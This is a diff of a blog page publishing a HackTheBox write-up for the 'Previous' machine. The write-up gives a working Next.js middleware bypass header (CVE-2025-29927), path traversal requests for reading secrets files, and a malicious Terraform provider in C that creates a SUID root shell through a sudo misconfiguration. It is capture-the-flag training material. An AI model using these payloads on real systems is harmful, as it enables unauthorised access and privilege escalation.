@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Previous - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Previous.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Previous machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Previous machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Previous, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,179 @@
         <h1 class="writeup-title">Previous</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">January 10, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Previous" src="../images/Previous/pwned.png" /></p>
-<p>Previous is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Previous retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Previous/pwned.png" /></p>
+<p>Previous was a medium-difficulty Linux box focusing on exploiting CVE-2025-29927, a critical Next.js middleware authentication bypass vulnerability.
+I bypassed authentication by adding the x-middleware-subrequest header with recursive middleware depth (middleware:middleware:middleware:middleware:middleware) to access the /docs endpoint without credentials.
+This revealed a download API endpoint vulnerable to path traversal, which I exploited to extract sensitive Next.js files including .env configuration, routes-manifest.json, and the [...nextauth].js authentication handler containing hardcoded credentials (Jeremy:MyNameIsJeremyAndILovePancakes) that granted SSH access.</p>
+<p>For privilege escalation, Jeremy had sudo access to Terraform with the -chdir flag restricting operations to /opt/examples. I exploited Terraform's provider system by creating a malicious binary named terraform-provider-examples that copied /bin/bash to /tmp/rootbash with the SUID bit set.
+Using the TF_CLI_CONFIG_FILE environment variable, I forced Terraform to load a custom .terraformrc configuration file that redirected the provider override path to /tmp where my malicious binary resided.
+Executing the Terraform command triggered the malicious provider, creating the SUID bash which I executed with -p to obtain root access.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Previous/nmap.png" /></p>
+<p>Initial nmap scan reveals just 2 ports. SSH on 22, and a website on 80.</p>
+<h2>Investigating The Website</h2>
+<p><img alt="website" src="../images/Previous/website.png" /></p>
+<p>Both buttons lead to a <code>sign-in</code> page, and there's nothing I can do with that right now. I'll look at the headers and the request with BurpSuite.</p>
+<p><img alt="req" src="../images/Previous/req.png" /></p>
+<p>In this request, I can see a cookie and a header related to <code>next-auth</code>. This is an open-source authentication library for Next.js projects.</p>
+<p><a href="NextAuth">https://next-auth.js.org</a></p>
+<p>I'll look for vulnerabilities affecting next-auth. Right now, the goal is to somehow get past that login page.</p>
+<p><a href="CVE-2025-29927">https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass</a></p>
+<p>This vulnerability revolves around the <code>middleware</code> functionality in Next.js. It is commonly used to implement access controls, restrict access for unauthorized users, add headers to reuqests and inspect them before passing them on to their intended destination.</p>
+<p>The issue is caused by the fact that the <code>x-middleware-subrequest</code> header, used internally to route users based on their access level and other circumstances, can be added by an adversary and used to completely skip middleware checks and potentially access resources they shouldn't.</p>
+<h2>Bypassing the login page to access protected resources</h2>
+<p>I can get theNext.JS version with devtools by running <code>next.version</code>. This will grab the version number directly from the variable.</p>
+<p><img alt="version" src="../images/Previous/version.png" /></p>
+<p>Version 15.2.2 falls into the vulnerable range. I'll use the appropriate payload, which accomodates for recursion and middleware depth.</p>
+<p><code>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</code></p>
+<p><img alt="req2" src="../images/Previous/req2.png" /></p>
+<p>This is the request sent after clicking on the docs button. The authentication has been redirected to a middleware, and if it is successful, the user will be redirected to <code>/docs.</code></p>
+<p>Knowing this is a vulnerable instance, I can reach <code>/docs</code> directly by adding the middleware header to the request.</p>
+<p><img alt="logged" src="../images/Previous/logged.png" /></p>
+<p>Now I'm logged in! Notice how the user is displayed as <code>???</code>, because there is no user to associate with this "session".</p>
+<h2>LFI in the download parameter</h2>
+<p><img alt="loggedin" src="../images/Previous/loggedin.png" /></p>
+<p>There are 2 endpoints to check out from this point. I'll repeat the middleware addition process again for each of them.</p>
+<pre class="codehilite"><code># getting-started
+GET /docs/getting-started?section=getting-started HTTP/1.1
+Host: previous.htb
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fdocs
+Accept-Encoding: gzip, deflate, br
+Cookie: next-auth.csrf-token=50146f861f5c10203b16041c38f246a28554b08890619c0f5a27b8b0d5c6f79f%7Cf8ecdc2d6d7fecd9140215ae102017e9218a3f519385e66e836b947a5bc729bd; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs%2Fapi-reference
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+Connection: keep-alive
+</code></pre>
+
+<p>I removed the api/auth callback portion of the link, but all I got from this page was an error.</p>
+<p>On the other hand, the examples endpoint returns valid content and even a download link.</p>
+<pre class="codehilite"><code>GET /_next/data/-ipsiOtEey-zESpHzrwmc/docs/examples.json?section=examples HTTP/1.1
+Host: previous.htb
+x-nextjs-data: 1
+purpose: prefetch
+x-middleware-prefetch: 1
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Accept: */*
+Referer: http://previous.htb/docs/examples?section=examples
+Accept-Encoding: gzip, deflate, br
+Cookie: next-auth.csrf-token=50146f861f5c10203b16041c38f246a28554b08890619c0f5a27b8b0d5c6f79f%7Cf8ecdc2d6d7fecd9140215ae102017e9218a3f519385e66e836b947a5bc729bd; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fdocs%2Fapi-reference
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+Connection: keep-alive
+</code></pre>
+
+<p><img alt="examples" src="../images/Previous/examples.png" /></p>
+<p>This link allows me to download a hello-world.ts file, but the download link itself looks quite vulnerable.</p>
+<pre class="codehilite"><code>GET /api/download?example=hello-world.ts HTTP/1.1
+Host: previous.htb
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://previous.htb/docs/examples?section=examples
+Accept-Encoding: gzip, deflate, br
+Cookie: next-auth.csrf-token=50146f861f5c10203b16041c38f246a28554b08890619c0f5a27b8b0d5c6f79f%7Cf8ecdc2d6d7fecd9140215ae102017e9218a3f519385e66e836b947a5bc729bd; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000%2Fapi%2Fdownload%3Fexample%3Dhello-world.ts
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+Connection: keep-alive
+</code></pre>
+
+<p>Notice how it is looking for the filename as a parameter value. If there is no sanitization, this can be manipulated to retrieve local files like /etc/passwd via path traversal.</p>
+<p><code>/api/download?example=../../../../etc/passwd</code></p>
+<p><img alt="lfi" src="../images/Previous/lfi.png" /></p>
+<p>LFI confirmed! Now I can pull local files from the box. This opens up a whole new avenue of possible exploitation.</p>
+<h2>Looking for sensitive Next.JS files on the box</h2>
+<p>Using the official Next.js documentation, I can find a few files to grab. I will check how many <code>../</code> it takes to reach the top-level files.</p>
+<p><a href="https://nextjs.org/docs/app/getting-started/project-structure">https://nextjs.org/docs/app/getting-started/project-structure</a></p>
+<p><img alt="package" src="../images/Previous/package.png" /></p>
+<p>Package.json required 2 jumps. This file contains a list of packages within a Next.js project. Aside from that, I also found the .env file.</p>
+<p><img alt="env" src="../images/Previous/env.png" /></p>
+<p>This secret could potentially allow me to forge tokens for the next-auth service... But I've already skipped authentication, so it is of no use for me right now.</p>
+<p>I decided to skip ahead and check out the .next directory, particularly the <code>required-server-files.json</code> file, which contains configuration, dependencies, and files required for the server to run.</p>
+<p><img alt="required" src="../images/Previous/required.png" /></p>
+<p>I can see some very promising files. First, I'll look into the <code>routes-manifest.json</code> file, which is a roadmap for the application's routing system.</p>
+<p><img alt="routes" src="../images/Previous/routes.png" /></p>
+<p>A dynamic route in Next.js allows developers to use a <code>[placeholder]</code>, which can change based on data provided. Instead of creating many routes like <code>path/A</code>, <code>path/B</code>, a single file can handle all possible variations for that segment.</p>
+<pre class="codehilite"><code>Page - The file-system path to the route: /api/auth/[...nextauth].
+
+Regex - The regular expression Next.js uses to match incoming URLs like /api/auth/signin or /api/auth/callback.
+
+RouteKeys - Maps the dynamic segment to an internal variable name (e.g., nxtPnextauth).
+
+NamedRegex - A version of the regex that extracts the specific segment values into the params object for use in your code.
+</code></pre>
+
+<p>In this particular route, I can also see the <code>...</code> dots within the section. This is a catch-all route, used to allow matching of multiple URL segments at once. This data is passed in as an array.</p>
+<p>Even if this is a dynamic route, it will still have a local file on the filesystem. I can grab it with the same path traversal method as earlier. This is important because a file like this could contain secrets or other kinds of passwords.</p>
+<p>I will url-encode the <code>[]</code> brackets to avoid issues with the URL.</p>
+<p><code>.next/server/pages/api/auth/%5B...nextauth%5D.js</code></p>
+<p><img alt="auth" src="../images/Previous/auth.png" /></p>
+<p>And look! It did indeed have credentials for the user Jeremy.</p>
+<p><code>Jeremy | MyNameIsJeremyAndILovePancakes</code></p>
+<p>Since I already pretty much own the web app, I'll test these credentials against the box with SSH.</p>
+<p><img alt="user" src="../images/Previous/user.png" /></p>
+<h1>Root Flag</h1>
+<p><img alt="sudol" src="../images/Previous/sudol.png" /></p>
+<p>Jeremy can run Terraform as root. This is a tool used for the setup of infrastructure to a desired state, managed by user-created configuration files.</p>
+<p>The -chdir flag restricts the working directory to <code>/opt/examples</code>, which is owned by root. I cannot make any changes to that directory and its contents.</p>
+<h2>Exploiting Terraform's Config File Creation</h2>
+<p><img alt="commands" src="../images/Previous/commands.png" /></p>
+<p>Here are all the commands I can run with Terraform. As root, I am limited to the apply command locked to the /opt/examples directory. I'll run <code>init</code> to create a configuration file in my current directory.</p>
+<p><img alt="creation" src="../images/Previous/creation.png" /></p>
+<p>A <code>.terraformrc</code> file has been created, alongside a <code>terraform.d</code> directory.</p>
+<pre class="codehilite"><code># .terraformrc
+
+provider_installation {
+        dev_overrides {
+                &quot;previous.htb/terraform/examples&quot; = &quot;/usr/local/go/bin&quot;
+        }
+        direct {}
+}
+</code></pre>
+
+<p>A provider is a plugin that interacts with third-party tools and other APIs. By using the dev_overrides, a developer can use local, custom-built provider binaries instead of official versions.</p>
+<p>I will take a look into the <code>/usr/local/go/bin</code> directory,</p>
+<p><img alt="binary" src="../images/Previous/binary.png" /></p>
+<p><code>terraform-provider-examples</code> is an ELF binary. Knowing this, I'm pretty confident I'll be able to execute my own binaries if I can force Terraform to use the Jeremy-controlled .terraformrc file.</p>
+<p><a href="https://developer.hashicorp.com/terraform/cli/config/environment-variables">https://developer.hashicorp.com/terraform/cli/config/environment-variables</a></p>
+<p>The <code>TF_CLI_CONFIG_FILE</code> variable sounds like the exact thing I was missing. The plan is 100% doable now.</p>
+<h2>Creating a malicious provider</h2>
+<p>I will create a simple script, its sole purpose being to copy /bin/bash into a different directory, and give it the SUID bit so that it can be run as root.</p>
+<pre class="codehilite"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+        system(&quot;cp /bin/bash /tmp/rootbash &amp;&amp; chmod 4755 /tmp/rootbash&quot;);
+        return 0;
+}
+</code></pre>
+
+<p>I'll compile this file into a bin named <code>terraform-provider-examples</code>, and I'll drop it into the created <code>/tmp/malicious</code> directory. The last part of the binary's name should match the provider binary, as that is what Terraform will execute.</p>
+<p>Since the only available provider is <code>previous.htb/terraform/examples</code>, Terraform will execute any <code>terraform-provider-examples</code> binary it finds, making privilege escalation possible.</p>
+<p>After that, I will modify the local .terraformrc file so that it points to my malicious binary.</p>
+<pre class="codehilite"><code>provider_installation {
+        dev_overrides {
+                &quot;previous.htb/terraform/examples&quot; = &quot;/tmp/malicious&quot;
+        }
+        direct {}
+}
+</code></pre>
+
+<p>After everything is done, I will run the full command that will execute my malicious binary and create a SUID bash in /tmp.</p>
+<p><code>TF_CLI_CONFIG_FILE='/home/jeremy/.terraformrc' sudo /usr/bin/terraform -chdir=/opt/examples apply</code></p>
+<p><img alt="rootbash" src="../images/Previous/rootbash.png" /></p>
+<p>Now all that's left is to run the SUID bash, remembering to use the -p flag for preserving the SUID bit. Otherwise, it'll just drop a Jeremy shell, which I don't want.</p>
+<p><img alt="root" src="../images/Previous/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -87,7 +250,7 @@
     
     <footer>
         <div class="container">
-            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
         </div>
     </footer>
 
